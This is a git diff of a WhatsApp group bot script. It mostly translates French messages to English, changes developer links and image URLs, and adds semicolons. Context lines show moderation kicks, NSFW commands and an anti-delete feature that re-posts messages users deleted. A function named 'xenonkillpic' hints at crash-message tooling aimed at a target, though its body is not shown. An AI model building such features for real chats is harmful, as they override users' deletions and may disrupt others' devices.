@@ -2,7 +2,7 @@
 //re-upload? recode? copy code? give credit ya :)
 //YouTube: @Dr_Xenon1
 //Instagram: Dr.Xenon2
-//Telegram: t.me/XenonBotInc
+//Telegram: t.me/Dr_Xenon1
 //GitHub: @Dr_Xenon1
 //WhatsApp: +2250500107362
 //want more free bot scripts? 
@@ -67,8 +67,8 @@ const o = fs.readFileSync(`./69/o.jpg`)
 
 //media
 const VoiceNoteXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/xenonvn.json'));
-const StickerXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/xenonsticker.json'));
-const ImageXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/xeonimage.json'));
+const StickerXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/XenonSticker.json'));
+const ImageXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/xenonimage.json'));
 const VideoXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/xenonvideo.json'));
 const DocXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/doc.json'));
 const ZipXenon = JSON.parse(fs.readFileSync('./XenonMedia/database/zip.json'));
@@ -398,7 +398,7 @@ module.exports = XenonBotInc = async (XenonBotInc, m, chatUpdate, store) => {
         } 
         if (!m.sender.startsWith(`${antiforeignnumber}`) && db.groups[m.chat].antiforeignnum === true){ 
         	if (XenonTheCreator || m.isAdmin || !m.isBotAdmin) return
-            XenonBotInc.sendMessage(m.chat, { text: `Désolé mon pote ! Tu seras supprimé car l'administrateur/propriétaire du groupe a activé la fonction anti-numéro étranger, uniquement +${antiforeignnumber} le code du pays est autorisé à rejoindre le groupe` }, {quoted: m})
+            XenonBotInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
             await sleep(2000)
             await XenonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
         }
@@ -476,7 +476,7 @@ XenonBotInc.sendMessage(m.chat,
 			            participant: m.key.participant
 			        }
 			    })
-XenonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Promotion détectée 」\`\`\`\n\n@${m.sender.split("@")[0]} a envoyé un message de promotion et l'a supprimé avec succès`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+XenonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 }
 }
 
@@ -493,7 +493,7 @@ XenonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Promotion détectée 」\`\`\`\
 			            participant: m.key.participant
 			        }
 			    })
-			XenonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Gros mot détecté 」\`\`\`\n\n@${m.sender.split("@")[0]} utilisait des mots grossiers et sa conversation a été supprimée`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			XenonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
                }
             }
         }
@@ -508,7 +508,7 @@ if (!m.m.isBotAdmin) return
 if(XenonTheCreator) return
 XenonBotInc.groupParticipantsUpdate(m.chat, [sender], 'remove')
 await XenonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
-XenonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Bonjour propriétaire ! wa.me/${sender.split("@")[0]} Détection de l'envoi de Virtex ${isGroup?`in ${groupName}`:''}`})
+XenonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
  }
  }
     
@@ -608,7 +608,7 @@ if (XenonTheCreator) return replygcxenon(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			XenonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Lien détecté 」\`\`\`\n\n@${m.sender.split("@")[0]} a envoyé un lien et l'a supprimé avec succès`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			XenonBotInc.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
             }
         }
         
@@ -618,17 +618,17 @@ try {
 if (budy.match(`instagram.com`)) {
 await XenonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
 let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
-XenonBotInc.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Téléchargement automatique ✅`}, {quoted: m})
+XenonBotInc.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
 await XenonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
 } else if (budy.match(`tiktok.com`)) {
 await XenonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
 let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
-XenonBotInc.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Téléchargement automatique ✅`}, {quoted: m})
+XenonBotInc.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
 await XenonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
 } else if (budy.match(`facebook.com`)) {
 await XenonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
 let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
-XenonBotInc.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Téléchargement automatique ✅`}, {quoted: m})
+XenonBotInc.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
 await XenonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
 } else if (budy.match(`youtube.com|youtu.be`)) {
 await XenonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
@@ -653,7 +653,7 @@ await XenonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})
 				const mess = chatUpdate.messages[0].message.protocolMessage
 				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
 					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
-					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti-Suppression❗*'}, ...chats.key }
+					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }
 					await XenonBotInc.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
 				}
 			}
@@ -682,10 +682,10 @@ fs.writeFileSync('./src/user.json', JSON.stringify(xenonverifieduser, null, 2))
 			}
 			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
 				replygcxenon({
-					'-3': 'Le jeu est terminé',
-					'-2': 'Invalide',
-					'-1': 'Position invalide',
-					0: 'Position invalide',
+					'-3': 'The game is over',
+					'-2': 'Invalid',
+					'-1': 'Invalid Position',
+					0: 'Invalid Position',
 				}[ok])
 				return !0
 			}
@@ -715,7 +715,7 @@ fs.writeFileSync('./src/user.json', JSON.stringify(xenonverifieduser, null, 2))
 				global.db.users[m.sender].limit += 3
 				global.db.users[m.sender].uang += 3000
 			}
-			let str = `ID de la chambre : ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Fin de partie` : `Tourner ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nTapez *surrender* pour abandonner et admettre la défaite`
+			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
 			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
 			room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
 			if (room.x !== room.o) await XenonBotInc.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m })
@@ -732,21 +732,21 @@ fs.writeFileSync('./src/user.json', JSON.stringify(xenonverifieduser, null, 2))
 			let tie = false
 			if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
 	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
-					replygcxenon(`@${roof.p2.split`@`[0]} a rejeté la poursuite,\npoursuite annulée`)
+					replygcxenon(`@${roof.p2.split`@`[0]} rejected the suit,\nsuit cancelled`)
 					delete game.suit[roof.id]
 					return !0
 				}
 				roof.status = 'play';
 				roof.asal = m.chat;
 				clearTimeout(roof.waktu);
-				replygcxenon(`Le costume a été envoyé pour discuter\n\n@${roof.p.split`@`[0]} Cher @${roof.p2.split`@`[0]}\n\nVeuillez sélectionner une combinaison dans le chat correspondant https://wa.me/${botNumber.split`@`[0]}`)
-				if (!roof.pilih) XenonBotInc.sendMessage(roof.p, { text: `Veuillez sélectionner \n\nPierre🗿\nPapier📄\nCiseaux✂️` }, { quoted: m })
-				if (!roof.pilih2) XenonBotInc.sendMessage(roof.p2, { text: `Veuillez sélectionner \n\nPierre🗿\nPapier📄\nCiseaux✂️` }, { quoted: m })
+				replygcxenon(`The suit has been sent to chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nPlease select a suit in the respective chat https://wa.me/${botNumber.split`@`[0]}`)
+				if (!roof.pilih) XenonBotInc.sendMessage(roof.p, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
+				if (!roof.pilih2) XenonBotInc.sendMessage(roof.p2, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
 				roof.waktu_milih = setTimeout(() => {
-					if (!roof.pilih && !roof.pilih2) replygcxenon(`Les deux joueurs n'ont aucune intention de jouer,\nProcès annulé`)
+					if (!roof.pilih && !roof.pilih2) replygcxenon(`Both players have no intention of playing,\nSuit cancelled`)
 					else if (!roof.pilih || !roof.pilih2) {
 						win = !roof.pilih ? roof.p2 : roof.p
-						replygcxenon(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} je n'ai pas choisi de costume, le jeu se termine`)
+						replygcxenon(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose a suit, the game ends`)
 					}
 					delete game.suit[roof.id]
 					return !0
@@ -921,7 +921,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: ownername,
-thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+thumbnailUrl: 'https://i.ibb.co/cvXxmHC/cheemspic.jpg',
 sourceUrl: websitex
 },
 },
@@ -1234,7 +1234,7 @@ async function xenonkillpic(target, kuwoted) {
       header: {
         title: "⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ",
         hasMediaAttachment: true,
-        ...(await prepareWAMessageMedia({ image: { url: "https://imgur.com/a/Kx2xDAw" } }, { upload: XenonBotInc.waUploadToServer }))
+        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XenonBotInc.waUploadToServer }))
       },
       body: {
         text: ""
@@ -1616,9 +1616,8 @@ case 'handsomecheck':{
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-					break
+					break;
 //===========================================================================================================================//
-
 case 'beautifulcheck':{
 				if (!text) return replygcxenon(`Tag Someone, Example : ${prefix + command} @Xenon`)
 					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -1663,11 +1662,10 @@ case 'beautifulcheck':{
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-					break
+					break;
 //===========================================================================================================================//
-
 					case 'charactercheck':{
-					if (!text) return replygcxenon(`Tag Someone, Example : ${prefix + command} @Dr_Xenon1`)
+					if (!text) return replygcxenon(`Tag Someone, Example : ${prefix + command} @Xenon`)
 					const xenony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
 					const taky = xenony[Math.floor(Math.random() * xenony.length)]
 					let msgs = generateWAMessageFromContent(m.chat, {
@@ -1710,25 +1708,22 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-				     break
+				     break;
 //===========================================================================================================================//
-
 case 'gura':
 case 'gurastick':{
-var ano = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/main/gura')
+var ano = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/main/gura')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await XenonBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
 
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'rentbot':
                 replygcxenon(`Type ${prefix}owner and chat him`)
-                break
+                break;
 //===========================================================================================================================//
-
 			case "idgroup": case "idgc": case "groupid": {
 if (!XenonTheCreator) return XenonStickOwner()
 let getGroups = await XenonBotInc.groupFetchAllParticipating()
@@ -1741,9 +1736,8 @@ teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member :
 }
 replygcxenon(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'repo': case 'repository': {
   try {
     const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
@@ -1779,9 +1773,8 @@ ${themeemoji} URL: ${repoData.html_url}
     await replygcxenon(`Repository currently not available `)
   }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'myip':
             case 'ipbot':
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -1795,9 +1788,8 @@ break
                         replygcxenon("🔎 My public IP address is: " + ip);
                     })
                 })
-            break
+            break;
 //===========================================================================================================================//
-
             case 'request': case 'reportbug': {
 	if (!text) return replygcxenon(`Example : ${
         prefix + command
@@ -1823,9 +1815,8 @@ break
             })
 
         }
-        break
+        break;
 //===========================================================================================================================//
-
 			case 'socialmedia': 
         case 'sosmed': 
         case 'update':{
@@ -1836,9 +1827,9 @@ break
         `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
         botname, // Footer message
         'Visit', // Button display text
-        'https://youtube.com/@Dr_Xenon1', // Command (URL in this case)
+        'https://youtube.com/@Dr_Xenon2', // Command (URL in this case)
         'cta_url', // Button type
-        'https://youtube.com/@Dr_Xenon1' // URL (used in image generation)
+        'https://youtube.com/@Dr_Xenon2' // URL (used in image generation)
     ], 
     [
         'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
@@ -1846,9 +1837,9 @@ break
         `Susbcribe Developer's Telegram Channel To Get Updates`, // Body message
         botname, // Footer message
         'Visit', // Button display text
-        'https://t.me/Dr_Xenon1', // Command (URL in this case)
+        'http://t.me/Dr_Xenon1', // Command (URL in this case)
         'cta_url', // Button type
-        'https://t.me/Dr_Xenon1' // URL (used in image generation)
+        'http://t.me/Dr_Xenon1' // URL (used in image generation)
     ], 
     [
         'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
@@ -1866,9 +1857,9 @@ break
         `Follow Developer On Instagram`, // Body message
         botname, // Footer message
         'Visit', // Button display text
-        'https://www.instagram.com/Dr.Xenon2', // Command (URL in this case)
+        'https://www.instagram.com/dr_xenon2', // Command (URL in this case)
         'cta_url', // Button type
-        'https://www.instagram.com/Dr.Xenon2' // URL (used in image generation)
+        'https://www.instagram.com/dr_xenon2' // URL (used in image generation)
     ], 
     [
         'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
@@ -1902,44 +1893,37 @@ const sendSlide = async (jid, title, message, footer, slides) => {
                     url: url,
                     merchant_url: url,
                 };
-                break
-//===========================================================================================================================//
-;
+                break;
+//===========================================================================================================================//;
             case "cta_call":
                 buttonParamsJson = { display_text: textCommand, id: command };
-                break
-//===========================================================================================================================//
-;
+                break;
+//===========================================================================================================================//;
             case "cta_copy":
                 buttonParamsJson = {
                     display_text: textCommand,
                     id: "",
                     copy_code: command,
                 };
-                break
-//===========================================================================================================================//
-;
+                break;
+//===========================================================================================================================//;
             case "cta_reminder":
             case "cta_cancel_reminder":
             case "address_message":
                 buttonParamsJson = { display_text: textCommand, id: command };
-                break
-//===========================================================================================================================//
-;
+                break;
+//===========================================================================================================================//;
             case "send_location":
                 buttonParamsJson = {};
-                break
-//===========================================================================================================================//
-;
+                break;
+//===========================================================================================================================//;
              case "quick_reply":
              buttonParamsJson = { display_text: textCommand, id: command };
-             break
-//===========================================================================================================================//
-;
+             break;
+//===========================================================================================================================//;
             default:
-                break
-//===========================================================================================================================//
-;
+                break;
+//===========================================================================================================================//;
         }
         const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
         return {
@@ -2017,9 +2001,8 @@ const sendSlide = async (jid, title, message, footer, slides) => {
 // Call the function with example parameters
 sendSlide(m.chat, 'removed you', ownername, botname, slides);
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'gita-verse': case 'gita': case 'bhagavatgita': {
 	try {
     // Extract the verse number from the command text.
@@ -2054,9 +2037,8 @@ ${json.purport}`
     // Handle the error appropriately
   }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'quran': {
     try {
     // Extract the surah number or name from the command text.
@@ -2107,9 +2089,8 @@ ${translatedTafsirEnglish.text}`
     replygcxenon(`Error: ${error.message}`)
   }
   }
-  break
+  break;
 //===========================================================================================================================//
-
 			case 'animequote': {
   try {
     const res = await fetch('https://some-random-api.com/animu/quote');
@@ -2160,9 +2141,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     console.error(error)
   }
   }
-  break
+  break;
 //===========================================================================================================================//
-
   case 'bible': {
   	const { translate } = require('@vitalets/google-translate-api')
   	const BASE_URL = 'https://bible-api.com'
@@ -2234,9 +2214,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     replygcxenon(`Error: ${error.message}`)
   }
   }
-  break
+  break;
 //===========================================================================================================================//
-
 			case 'addlist':
 if (!XenonTheCreator) return XenonStickOwner()
 if (!m.isGroup) return XenonStickGroup()
@@ -2254,9 +2233,8 @@ if (fs.existsSync(media)) fs.unlinkSync(media)
 addResponList(m.chat, args1, args2, false, '-', db_respon_list)
 replygcxenon(`Successful Add List With Key : *${args1}*`)
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'dellist':
 if (!XenonTheCreator) return XenonStickOwner()
 if (!m.isGroup) return XenonStickGroup()
@@ -2265,9 +2243,8 @@ if (!q) return replygcxenon(`Usage Example: ${prefix + command} *Item name*\n\n_
 if (!isAlreadyResponList(m.chat, q, db_respon_list)) return replygcxenon(`Item list by Name *${q}* not in the database!`)
 delResponList(m.chat, q, db_respon_list)
 replygcxenon(`Successfully delete list message with key *${q}*`)
-break
+break;
 //===========================================================================================================================//
-
 case 'store':
 case 'shop': 
 case 'list': {
@@ -2278,17 +2255,15 @@ teks += `│⭔ ${x.key}\n`
 teks += `│\n└────────────⭓\n\n`
 replygcxenon(teks)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'setprefix':
                 if (!XenonTheCreator) return XenonStickOwner()
                 if (!text) return replygcxenon(`Example : ${prefix + command} #`)
                 global.xprefix = text
                 replygcxenon(`Prefix successfully changed to ${text}`)
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'addmsg': {
 	if (!XenonTheCreator) return XenonStickOwner()
                 if (!m.quoted) return replygcxenon('Reply Message You Want To Save In Database')
@@ -2302,18 +2277,16 @@ Access with ${prefix}getmsg ${text}
 
 View list of Messages With ${prefix}listmsg`)
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'getmsg': {
                 if (!text) return replygcxenon(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                 let msgs = global.db.database
                 if (!(text.toLowerCase() in msgs)) return replygcxenon(`'${text}' not listed in the message list`)
                 XenonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'listmsg': {
                 let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
 	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
@@ -2323,9 +2296,8 @@ View list of Messages With ${prefix}listmsg`)
 	        }
 	        replygcxenon(teks)
 	    }
-	    break
-//===========================================================================================================================//
- 
+	    break;
+//===========================================================================================================================// 
 	case 'delmsg': case 'deletemsg': {
 		if (!XenonTheCreator) return XenonStickOwner()
 	        let msgs = global.db.database
@@ -2333,9 +2305,8 @@ View list of Messages With ${prefix}listmsg`)
 		delete msgs[text.toLowerCase()]
 		replygcxenon(`Successfully deleted '${text}' from the message list`)
             }
-	    break
+	    break;
 //===========================================================================================================================//
-
 			case 'setcmd': {
                 if (!m.quoted) return replygcxenon('Reply Message!')
                 if (!m.quoted.fileSha256) return replygcxenon('SHA256 Hash Missing')
@@ -2351,9 +2322,8 @@ View list of Messages With ${prefix}listmsg`)
                 }
                 replygcxenon(`Done!`)
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'delcmd': {
                 let hash = m.quoted.fileSha256.toString('base64')
                 if (!hash) return replygcxenon(`No hashes`)
@@ -2361,9 +2331,8 @@ case 'delcmd': {
                 delete global.db.sticker[hash]
                 replygcxenon(`Done!`)
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'listcmd': {
                 let teks = `
 *List Hash*
@@ -2372,9 +2341,8 @@ ${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. 
 `.trim()
                 XenonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
             }
-            break
-//===========================================================================================================================//
- 
+            break;
+//===========================================================================================================================// 
 case 'lockcmd': {
                 if (!XenonTheCreator) return XenonStickOwner()
                 if (!m.quoted) return replygcxenon('Reply Message!')
@@ -2384,9 +2352,8 @@ case 'lockcmd': {
                 global.db.sticker[hash].locked = !/^un/i.test(command)
                 replygcxenon('Done!')
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'hentaivid': case 'hentai': case 'hentaivideo': {
 	if (!m.isGroup) return XenonStickGroup()
 if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2435,9 +2402,8 @@ if (!AntiNsfw) return replygcxenon(mess.nsfw)
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 
             }
-            break
+            break;
 //===========================================================================================================================//
-
 case 'trap' :{
 if (!m.isGroup) return XenonStickGroup()
 if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2484,9 +2450,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'hentai-neko' :
 case 'hneko' :{
 if (!m.isGroup) return XenonStickGroup()
@@ -2533,9 +2498,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'hentai-waifu' :
 case 'nwaifu' :{
 if (!m.isGroup) return XenonStickGroup()
@@ -2583,9 +2547,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'gasm':{
 if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2632,9 +2595,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
-//===========================================================================================================================//
-  
+break;
+//===========================================================================================================================//  
 case 'milf':{
 if (!m.isGroup) return XenonStickGroup()
 await XenonStickWait()
@@ -2681,9 +2643,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
-//===========================================================================================================================//
- 
+break;
+//===========================================================================================================================// 
 case 'animespank':{
 if (!m.isGroup) return XenonStickGroup()
 if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2730,9 +2691,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'blowjob':{
 if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2780,9 +2740,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'cuckold':{
 if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2830,9 +2789,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'eba':{
 if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2880,9 +2838,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'pussy':{
 if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2930,9 +2887,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'yuri':{
 if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -2980,9 +2936,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'zettai':{
 if (!m.isGroup) return XenonStickGroup()
 	if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -3030,9 +2985,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'gifblowjob':{
 if (!m.isGroup) return XenonStickGroup()
 if (!AntiNsfw) return replygcxenon(mess.nsfw)
@@ -3081,9 +3035,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'animeawoo':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
@@ -3127,9 +3080,8 @@ await XenonStickWait()
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animemegumin':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
@@ -3174,9 +3126,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animeshinobu':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
@@ -3221,9 +3172,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animehandhold':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
@@ -3268,9 +3218,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animehighfive':{
 await XenonStickWait()
